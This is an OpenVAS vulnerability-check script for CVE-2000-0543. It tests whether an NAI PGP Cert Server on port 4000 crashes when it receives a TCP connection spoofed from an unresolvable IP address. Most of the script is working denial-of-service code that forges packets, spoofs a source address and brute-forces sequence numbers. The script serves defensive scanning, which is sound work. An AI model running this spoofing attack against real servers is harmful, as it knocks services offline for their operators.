###############################################################################
# OpenVAS Vulnerability Test
# $Id: PGPCert_DoS.nasl 10411 2018-07-05 10:15:10Z cfischer $
#
# NAI PGP Cert Server DoS
#
# Authors:
# John Lampe (j_lampe@bellsouth.net)
# Changes by rd : description
#
# Copyright:
# Copyright (C) 2001 John Lampe....j_lampe@bellsouth.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.10442");
  script_version("$Revision: 10411 $");
  script_tag(name:"last_modification", value:"$Date: 2018-07-05 12:15:10 +0200 (Thu, 05 Jul 2018) $");
  script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
  script_bugtraq_id(1343);
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");
  script_cve_id("CVE-2000-0543");
  script_name("NAI PGP Cert Server DoS");
  script_category(ACT_DENIAL);
  script_family("Denial of Service");
  script_copyright("Copyright (C) 2001 John Lampe....j_lampe@bellsouth.net");
  script_dependencies("secpod_open_tcp_ports.nasl", "global_settings.nasl");
  script_mandatory_keys("TCP/PORTS");
  script_require_ports(4000);
  script_exclude_keys("keys/TARGET_IS_IPV6");

  script_tag(name:"solution", value:"Upgrade to the latest version.");

  script_tag(name:"summary", value:"It was possible to make the remote PGP Cert Server
  crash by spoofing a TCP connection that seems to come from an unresolvable IP address.");

  script_tag(name:"impact", value:"An attacker may use this flaw to prevent your PGP
  certificate server from working properly.");

  script_tag(name:"qod_type", value:"remote_vul");
  script_tag(name:"solution_type", value:"VendorFix");

  exit(0);
}

include("misc_func.inc");

if(TARGET_IS_IPV6())exit(0);

port1 = 4000;
if(!get_port_state(port1))exit(0);
soc = open_sock_tcp(port1);
if(!soc)exit(0);
close(soc);

dstaddr=get_host_ip();
srcaddr=this_host();
IPH = 20;
IP_LEN = IPH;

ip = forge_ip_packet(   ip_v : 4,
                        ip_hl : 5,
                        ip_tos : 0,
                        ip_len : IP_LEN,
                        ip_id : 0xABA,
                        ip_p : IPPROTO_TCP,
                        ip_ttl : 255,
                        ip_off : 0,
                        ip_src : srcaddr);
port = get_host_open_tcp_port();

tcpip = forge_tcp_packet(    ip       : ip,
                             th_sport : port,
                             th_dport : port,
                             th_flags : TH_SYN,
                             th_seq   : 0xF1C,
                             th_ack   : 0,
                             th_x2    : 0,
                             th_off   : 5,
                             th_win   : 512,
                             th_urp   : 0);
filter = string("tcp and (src addr ", dstaddr, " and dst addr ", srcaddr, " dst port ", port, ")");
result = send_packet(tcpip, pcap_active:TRUE, pcap_filter:filter);
if (result)  {
  tcp_seq = get_tcp_element(tcp:result, element:"th_seq");
}

#now spoof Funky IP with guessed sequence numbers

#packet 1.....SPOOF SYN
IPH = 20;
IP_LEN = IPH;
newsrcaddr = 10.187.76.12;
port = 4000;

ip2 = forge_ip_packet(   ip_v : 4,
                        ip_hl : 5,
                        ip_tos : 0,
                        ip_len : IP_LEN,
                        ip_id : 0xABA,
                        ip_p : IPPROTO_TCP,
                        ip_ttl : 255,
                        ip_off : 0,
                        ip_src : newsrcaddr);


tcpip = forge_tcp_packet(    ip       : ip2,
                             th_sport : 5555,
                             th_dport : port,
                             th_flags : TH_SYN,
                             th_seq   : 0xF1C,
                             th_ack   : 0,
                             th_x2    : 0,
                             th_off   : 5,
                             th_win   : 512,
                             th_urp   : 0);

result = send_packet(tcpip,pcap_active:FALSE);

# SPOOF SYN/ACK (brute guess next sequence number)
for (j=tcp_seq+1; j < tcp_seq + 25; j=j+1) {
  tcpip = forge_tcp_packet(    ip       : ip2,
                               th_sport : 5555,
                               th_dport : port,
                               th_flags : TH_ACK,
                               th_seq   : 0xF1D,
                               th_ack   : j,
                               th_x2    : 0,
                               th_off   : 5,
                               th_win   : 512,
                               th_urp   : 0);


  send_packet(tcpip,pcap_active:FALSE);
}

sleep(15);
soc = open_sock_tcp(port1);
if(!soc){
  security_message(port:port1);
  exit(0);
}

exit(99);